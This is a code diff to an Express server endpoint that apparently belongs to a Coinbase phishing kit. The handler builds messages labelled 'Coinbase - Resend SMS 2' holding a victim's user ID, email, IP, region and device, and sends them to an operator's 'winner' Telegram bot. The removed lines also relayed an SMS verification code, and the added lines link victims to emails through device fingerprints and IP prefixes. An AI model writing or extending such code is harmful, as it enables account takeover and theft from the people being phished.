@@ -834,58 +834,55 @@ app.post("/resend-sms", async (req, res) => {
 
 app.post("/resend-sms2", async (req, res) => {
   try {
-    const { sms2Id, userId, code } = req.body;
+    let { sms2Id, userId } = req.body;
 
-    console.log(`🔍 DEBUG /resend-sms2: Received sms2Id=${sms2Id}, userId=${userId}, code=${code}`);
+    console.log(`🔍 DEBUG /resend-sms2: sms2Id=${sms2Id}, userId=${userId}`);
 
-    if (!sms2Id || !userId || !code) {
-      console.log(`❌ Missing parameters!`);
-      return res.status(400).json({ error: "Missing sms2Id, userId, or code" });
+    if (!userId) {
+      return res.status(400).json({ error: "Missing userId" });
     }
-
-    console.log(`📲 Resending SMS 2 for ${sms2Id}`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
+    const fingerprint = getDeviceFingerprint(req);
+    const ipPrefix = ip.split(".").slice(0, 3).join(".");
 
-    // ✅ Get email from pendingSMS2
+    // ✅ Get email from fingerprint or IP
     let email = "unknown@example.com";
-    if (pendingSMS2[sms2Id]) {
+    
+    if (sms2Id && pendingSMS2[sms2Id]) {
       email = pendingSMS2[sms2Id].email || pendingSMS2[sms2Id].displayEmail || "unknown@example.com";
       console.log(`✅ Found email in pendingSMS2: ${email}`);
-    } else {
-      console.log(`❌ sms2Id NOT found in pendingSMS2!`);
+    } else if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
+      email = deviceFingerprintToEmail[fingerprint];
+      console.log(`✅ Found email via fingerprint: ${email}`);
+    } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
+      email = ipPrefixToEmail[ipPrefix];
+      console.log(`✅ Found email via IP: ${email}`);
     }
 
     const message =
       `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>💬 Code:</b> <code>${code}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
 
     console.log(`🔍 DEBUG: userWinnerTelegram[${email}] = ${userWinnerTelegram[email]}`);
 
-    // ✅ SEND TO WINNER ONLY - NO BUTTONS
+    // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
       console.log(`✅ Sending resend SMS 2 message to winner bot for ${email}`);
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML"
-        // ✅ NO reply_markup - no buttons!
       });
       console.log(`✅ Message sent!`);
     } else {
-      console.log(`❌ No winner for ${email} or email is empty`);
+      console.log(`❌ No winner for ${email}`);
       return res.status(400).json({ error: "No winner determined for this email" });
-    }
-
-    // Reset SMS2 status to pending so polling works again
-    if (pendingSMS2[sms2Id]) {
-      pendingSMS2[sms2Id].status = "pending";
     }
 
     res.json({ ok: true });
